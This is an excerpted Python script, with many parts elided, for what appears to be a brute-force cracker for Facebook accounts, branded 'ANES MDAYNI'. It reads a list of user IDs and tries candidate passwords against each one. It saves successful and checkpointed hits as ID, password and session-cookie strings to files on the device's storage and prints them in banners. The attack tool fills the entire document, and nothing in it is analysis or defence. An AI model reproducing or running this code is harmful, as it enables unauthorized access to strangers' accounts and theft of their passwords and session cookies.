...
g= datetime.datetime(2023, 11, 19, 1, 00 ,0)
...
os.system('espeak -a 300 " ZAIME ZAIME GOOD,   "'+uname)
#--------------[ USER-AGENT ]--------------#
...
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                     \033[1;31m\033[1;37m
 Author    √ 𝗔𝗡𝗘𝗦 𝗠𝗗𝗔𝗬𝗡𝗜
 Github    √ 𝗔𝗡𝗘𝗦-𝗠𝗗𝗔𝗬𝗡𝗜
 Tool Name √ \033[1;36m𝗔𝗡𝗘𝗦\033[1;37m
...
def menu():
	os.system('clear')
	banner()
	os.system('espeak -a 300 " ,   ,  ,   "')
	print('')
	print(' \033[32m[ 1 ] CRACK FILE [ ✓ ] ')
	print('')
	print(' \033[1;91m[ 2 ] CRAETE FILE [ ⛔ ] ')
	print('')
	SALE = input(' \033[32m~~CHOOSE ONE  ')
	if SALE in ['1','01']:
		FILE()
	if SALE in ['2','02']:
		DUMP()
...
def FILE():
	...
	try:
		...
		sol().print(win2)
		print('')
		os.system('espeak -a 300 " SOUFINE ZAIME "')
		virat = input('\033[1;91m FILE NAME :  \033[1;91m')
		for line in open(virat, 'r').readlines():
			id.append(line.strip())
		print(' 𝗔𝗡𝗘𝗦 𝗠𝗗𝗔𝗬𝗡𝗜 '+str(len(id)))
		setting()
...
def setting():
	os.system('clear')
	banner()
	os.system('espeak -a 300 " 𝗔𝗡𝗘𝗦 𝗠𝗗𝗔𝗬𝗡𝗜"')
	print(' \033[1;91m NEW [ 1-✘ ]  ')
	print('')
	print(' \033[1;91m OLD [ 2-✘ ]  ')
	print('')
	print(' \033[1;92mID RANDOM [ 3-✓ ]  ')
	print('')
	hu = input(' \033[32m~~CHOOSE ONE  = ')
	print('')
	if hu in ['1','01']:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r𝗔𝗡𝗘𝗦 𝗠𝗗𝗔𝗬𝗡𝗜  {P}{b}{loop}{P}•{b}{len(id)}{P}  • OK:{P}{H}{ok}{P} •  CP:{P}{M}{cp}{P} • ({bo}{'{:.0%}'.format(loop/float(len(id)))}  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{M} [𝗔𝗡𝗘𝗦 𝗠𝗗𝗔𝗬𝗡𝗜] {m}{idf} | {m}{pw} \n {M} \033[1;90m \033[1;90m{ua} ')
				...
				print(f'\r{h}[𝗔𝗡𝗘𝗦 𝗠𝗗𝗔𝗬𝗡𝗜] {h}{idf} | {h}{pw} \n {h}  {kuki}')
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					cetak(nel(statuscp1, title='𝗔𝗡𝗘𝗦 𝗠𝗗𝗔𝗬𝗡𝗜-XD CP'))
					open('/sdcard/4MBF-𝗔𝗡𝗘𝗦 𝗠𝗗𝗔𝗬𝗡𝗜/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
				...
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/4MBF-𝗔𝗡𝗘𝗦 𝗠𝗗𝗔𝗬𝗡𝗜/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='𝗔𝗡𝗘𝗦 𝗠𝗗𝗔𝗬𝗡𝗜-XD OK'))
					ok+=1
					break
					...
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]𝗔𝗡𝗘𝗦-XD OK[/bold green]'))
					ok+=1
					break
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'no' in taplikasi:
					...
					statusok = f'[bold green][•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]𝗔𝗡𝗘𝗦 𝗠𝗗𝗔𝗬𝗡𝗜-XD OK[/bold green]'))
					ok+=1
					break
			else:
				continue
...
def cek_opsi():
	...
	for kes in akun:
		try:
			...
			print('')
			li = '# 𝗔𝗡𝗘𝗦 𝗠𝗗𝗔𝗬𝗡𝗜 BERMASALAH, PERIKSA & COBA LAGI'
